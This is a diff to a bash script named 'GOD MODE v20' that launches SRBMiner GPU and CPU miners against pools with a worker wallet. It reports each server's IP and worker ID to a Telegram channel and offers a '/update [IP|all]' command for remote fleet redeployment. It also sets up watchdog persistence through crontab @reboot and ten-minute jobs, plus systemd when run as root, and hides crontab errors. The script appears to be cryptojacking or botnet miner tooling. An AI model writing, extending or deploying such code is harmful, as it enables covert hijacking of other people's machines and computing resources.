@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v19: VERBOSE STARTUP LOGS & DIAGNOSTICS         |
+# | GOD MODE v20: CRONTAB FIX & CLEAN ASCII TERMINAL OUTPUT  |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -73,7 +73,7 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & SETUP ]
+# [ PHASE 2: MODULE DOWNLOAD & ARCHITECTURE DETECTION ]
 # ----------------------------------------------------
 ARCH=$(uname -m)
 
@@ -285,7 +285,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V19 (VERBOSE ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V20 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -309,6 +309,7 @@ while true; do
             GPU_STATUS="🟢 Active"
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
+                    chmod +x "./\$BIN_GPU"
                     nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
@@ -403,58 +404,61 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 nohup ./watchdog.sh >/dev/null 2>&1 &
 
 # ----------------------------------------------------
-# [ PHASE 4: VERBOSE STARTUP DIAGNOSTICS ]
+# [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "🚀 ENGINE V19 INITIALIZED"
-echo "🌐 Server IP: $SERVER_IP"
-echo "🆔 Worker ID: $WORKER"
+echo "[+] ENGINE V20 INITIALIZED"
+echo "[+] Server IP: $SERVER_IP"
+echo "[+] Worker ID: $WORKER"
 echo "================================================="
 echo "[+] Igniting core engines..."
 sleep 4
 
 echo "-------------------------------------------------"
-echo "💻 CPU ENGINE STATUS:"
+echo "[+] CPU ENGINE STATUS:"
 if pgrep -f "$BIN_CPU" >/dev/null; then
     CPU_PID=$(pgrep -f "$BIN_CPU" | head -n 1)
-    echo "  🟢 RUNNING (PID: $CPU_PID)"
-    echo "  📄 Initial Log Tail:"
+    echo "  [OK] RUNNING (PID: $CPU_PID)"
+    echo "  [LOG] Initial Log Tail:"
     if [ -f "$LOG_CPU" ]; then
-        tail -n 3 "$LOG_CPU" 2>/dev/null | sed 's/^/     /'
+        tail -n 3 "$LOG_CPU" 2>/dev/null | sed 's/^/        /'
     else
-        echo "     (Initializing log file...)"
+        echo "        (Initializing log file...)"
     fi
 else
-    echo "  🔴 OFFLINE / FAILED TO START"
+    echo "  [ERR] OFFLINE / FAILED TO START"
 fi
 
 echo "-------------------------------------------------"
-echo "🎮 GPU ENGINE STATUS (SRBMiner Pearl):"
+echo "[+] GPU ENGINE STATUS (SRBMiner Pearl):"
 if [ "$HAS_GPU" -eq 1 ]; then
     if pgrep -f "$BIN_GPU" >/dev/null; then
         GPU_PID=$(pgrep -f "$BIN_GPU" | head -n 1)
-        echo "  🟢 RUNNING (PID: $GPU_PID)"
-        echo "  📄 Initial Log Tail:"
+        echo "  [OK] RUNNING (PID: $GPU_PID)"
+        echo "  [LOG] Initial Log Tail:"
         if [ -f "$LOG_GPU" ]; then
-            tail -n 3 "$LOG_GPU" 2>/dev/null | sed 's/^/     /'
+            tail -n 3 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
         else
-            echo "     (Initializing log file...)"
+            echo "        (Initializing log file...)"
         fi
     else
-        echo "  🔴 OFFLINE / FAILED TO START"
+        echo "  [ERR] OFFLINE / CHECKING GPU LOGS:"
+        if [ -f "$LOG_GPU" ]; then
+            tail -n 5 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
+        fi
     fi
 else
-    echo "  ⚪ N/A (CPU-Only Machine)"
+    echo "  [INFO] N/A (CPU-Only Machine)"
 fi
 echo "================================================="
 
 # ----------------------------------------------------
-# [ PHASE 5: UNIVERSAL PERSISTENCE ]
+# [ PHASE 5: SAFE PERSISTENCE ]
 # ----------------------------------------------------
 if command -v crontab >/dev/null 2>&1; then
     (crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
      echo "@reboot $BASE_DIR/watchdog.sh"; \
-     echo "*/10 * * * * $BASE_DIR/watchdog.sh") | crontab -
+     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | crontab - 2>/dev/null
 fi
 
 if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
